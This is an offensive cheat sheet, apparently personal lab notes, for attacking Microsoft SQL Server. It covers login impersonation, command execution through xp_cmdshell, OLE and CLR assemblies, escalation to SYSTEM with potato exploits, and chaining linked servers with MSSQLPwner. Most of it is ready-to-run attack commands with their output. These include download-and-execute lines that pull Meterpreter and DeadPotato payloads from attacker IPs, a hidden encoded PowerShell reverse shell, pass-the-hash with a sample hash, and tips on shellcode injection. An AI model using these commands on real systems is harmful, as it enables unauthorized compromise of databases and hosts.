# Escalation by Impersonation

## PowerUpSQL
```powershell
Invoke-SQLAudit -Verbose -Instance DC01

# Individual check for who we can impersonate
Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance DC01

<#
VERBOSE: dc01 : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
VERBOSE: dc01 : CONNECTION SUCCESS.
VERBOSE: dc01 : - Logins can be impersonated.
VERBOSE: dc01 : - BUILTIN\Users can impersonate the sa sysadmin login.
VERBOSE: dc01 : - EXPLOITING: Starting exploit process...
VERBOSE: dc01 : - EXPLOITING: Verified that the current user (CORP1\offsec) is NOT a sysadmin.
VERBOSE: dc01 : - EXPLOITING: Attempting to add the current user (CORP1\offsec) to the sysadmin role by impersonating sa...
VERBOSE: dc01 : - EXPLOITING: It was possible to make the current user (CORP1\offsec) a sysadmin!
VERBOSE: dc01 : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
#>

# Rerun and escalate
Invoke-SQLAuditPrivImpersonateLogin  -Verbose -Instance DC01 -Exploit
```

## SQLRecon
```powershell
# Enumerate who we can impesonate
.\SQLRecon.exe /a:WinToken /h:DC01 /m:impersonate

# Impersonate target user. (must be combined with a module)
.\SQLRecon.exe /a:WinToken /h:DC01 /m:impersonate /i:sa /m:whoami
.\SQLRecon.exe /a:WinToken /h:DC01 /m:impersonate /i:sa /m:enablexp
.\SQLRecon.exe /a:WinToken /h:DC01 /m:impersonate /i:sa /m:xpcmd /c:"whoami /all"
```


# Code Execution
## PowerUpSQL
```powershell
# xp_cmdshell
Invoke-SQLOSCmd -Verbose -Command "whoami" -Instance DC01 -RawResults

# CLR
Invoke-SQLOSCmdCLR -Verbose -Command "powershell.exe get-process" -Instance DC01 -RawResults

# OLE
Invoke-SQLOSCmdOle -Verbose -Command "powershell.exe -c whoami" -Instance DC01 -RawResults
```
## MSSQLClient
```bash
mssqlclient.py -dc-ip 192.168.210.5 corp1.com/offsec:lab@192.168.210.5 -windows-auth

# Enable xp_cmdshell
enable_xp_cmdshell

# Execute Commands
xp_cmdshell whoami /all
xp_cmdshell powershell.exe -c get-process
```
## SQLRecon
```powershell
# Enable xp_cmdshell and execute
.\SQLRecon.exe /a:WinToken /h:DC01 /m:enablexp
.\SQLRecon.exe /a:WinToken /h:DC01 /m:xpcmd /c:"whoami /all"

# Enable OLE and execute commands (No console output)
.\SQLRecon.exe /a:WinToken /h:DC01 /m:enableole
.\SQLRecon.exe /a:WinToken /h:DC01 /m:olecmd /c:"powershell.exe -c iex (iwr -usebasicparsing http://192.168.45.223/met.ps1)"
```

# Code Execution through CLR
When using shellcode runner / injection. Ensure to use techniques that create a seperate thread or execute in a new process otherwise it can cause issues when running a cleanup routine as the process hangs.
When using shellcode execution techniques through this method it is important to be aware of a few things.
- If using process injection we need to inject into a process the account we are impersonating has permissions to
- For example, if running under SA we cant inject into `explorer.exe` as the asscoiated account "SQL Telementry Service" would not have one
- We can instead inject into something like `sqlceip.exe`.

Otherwise for reliability the following techniques are more reliable:
- Shellcode runners
- Process Hollowing

## SQLRecon
.NET Library template for visual studio when performing CLR assembly execution
- https://gist.github.com/skahwah/c92a8ce41f529f40c14715c91b8f90ce

```powershell
# Enable CLR first
.\SQLRecon.exe /a:WinToken /h:DC01 /impersonate /i:sa /m:enableclr

# Execute .NET DLL
.\SQLRecon.exe /a:WinToken /h:DC01 /m:impersonate /i:sa /m:clr /dll:"C:\temp\Warhead.dll" /function:Main
.\SQLRecon.exe /a:WinToken /h:DC01 /m:impersonate /i:sa /m:clr /dll:"https://192.168.45.223/Warhead.dll" /function:Main
```

# MSSQL Service Account to SYSTEM
MSSQL service accounts are often configured with privileges that may allow privilege escalation to system. For example, the SeImpersonation privilege can often be abused by various potato based exploits to elevate to the local system account.

```powershell
# Using DeadPotato (Command Execution)
# https://github.com/lypd0/DeadPotato/releases
.\SQLRecon.exe /h:sql01.corp.com /a:wintoken /m:xpcmd /c:"powershell.exe -c iex (iwr -usebasicparsing http://192.168.45.197/Binaries/DeadPotato.exe -Outfile c:\windows\temp\o.exe); c:\windows\temp\o.exe -cmd whoami"

# Using Amnesiac (Obtain Reverse Shell)
# https://github.com/Leo4j/Amnesiac
.\SQLRecon.exe /h:sql01.corp.com /a:wintoken /m:xpcmd /c:"powershell.exe -c iex (iwr -usebasicparsing http://192.168.45.197/Binaries/DeadPotato.exe -Outfile c:\windows\temp\o.exe); c:\windows\temp\o.exe -cmd powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc JABzAGQAPQBOAG"
```
# Easy mode: MSSQLPwner
```bash
# Identify chains of escalation / execution
mssqlpwner -hashes ':9650a1367d69a0b4bd5c85823d48e478' 'domain.local/Computer01$'@172.16.122.223 -windows-auth interactive

# Identify chain to use for execution / escalation
MSSqlPwner#DB01 (domain.local\Computer01$@master/guest)> get-chain-list
[*] Chosen linked server: DB01
[*] Chain list:
[*] 3f163798-405a-4a51-a159-084aa944489a - DB01 (domain.local\Computer01$@master/guest) (domain.local\Computer01$ guest@master)
[*] d90e42d7-bac2-4930-9c2b-f435a96fdc3c - DB01 (domain.local\Computer01$>I:dev_int@master/guest) (dev_int guest@master)
[*] dfd60140-6176-4db3-aba3-91fb032abe26 - DB01 (domain.local\Computer01$>I:dev_int@master/guest) -> DB02 (dev_lab@master/guest) (dev_lab guest@master)
[*] 7473c5de-643a-400c-a2c8-487cf094745b - DB01 (domain.local\Computer01$>I:dev_int@master/guest) -> DB02 (dev_lab@master/guest) -> DB01 (sa@master/dbo) (sa dbo@master)
[*] ccfa50ce-2801-4028-a285-7cf20d7e5a4a - DB01 (domain.local\Computer01$>I:dev_int@master/guest) -> DB02 (dev_lab@master/guest) -> DB01 (sa>I:DB01\Administrator@master/dbo)
[*] eeca6fe8-d5eb-4103-8667-f3a6e47f9a95 - DB01 (domain.local\Computer01$>I:dev_int@master/guest) -> DB02 (dev_lab@master/guest) -> DB01 (sa@master/dbo) -> DB02 (sa@master/dbo) (sa dbo@master)
[*] 89bb3d7f-21f0-4630-a567-4699263ac544 - DB01 (domain.local\Computer01$>I:dev_int@master/guest) -> DB02 (dev_lab@master/guest) -> DB01 (sa@master/dbo) -> DB02 (sa>I:wordpress@master/dbo)
[*] e9db0f51-d9fa-436a-9c3f-30c9e31276e2 - DB01 (domain.local\Computer01$>I:dev_int@master/guest) -> DB02 (dev_lab@master/guest) -> DB01 (sa@master/dbo)


# Set chain by ID
set-chain 7473c5de-643a-400c-a2c8-487cf094745b

# Execute commands
MSSqlPwner#DB01 (domain.local\Computer01$>I:dev_int@master/guest) -> DB02 (dev_lab@master/guest) -> DB01 (sa>I:DB01\Administrator@master/dbo)> exec "powershell.exe -c get-process"
[*] Result: (Key: output) NULL
[*] Result: (Key: output) Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
[*] Result: (Key: output) -------  ------    -----      -----     ------     --  -- -----------                                                  
[*] Result: (Key: output)      74       5     3268       3700       0.02   2008   0 cmd                                                          
[*] Result: (Key: output)     135       8     6520      11256       0.02   4968   0 conhost                                                      
[*] Result: (Key: output)     493      18     2140       5372               384   0 csrss                                                        
[*] Result: (Key: output)     166      13     1632       4860               484   1 csrss                                                        
[*] Result: (Key: output)     256      14     3948      13676              2776   0 dllhost                                                      
[*] Result: (Key: output)     544      22    24016      49024               908   1 dwm                                                          
[*] Result: (Key: output)      48       6     1664       4832               736   1 fontdrvhost                                                  
[*] Result: (Key: output)      48       6     1520       4616               744   0 fontdrvhost                                                  
[*] Result: (Key: output)       0       0       56          8                 0   0 Idle                               
```
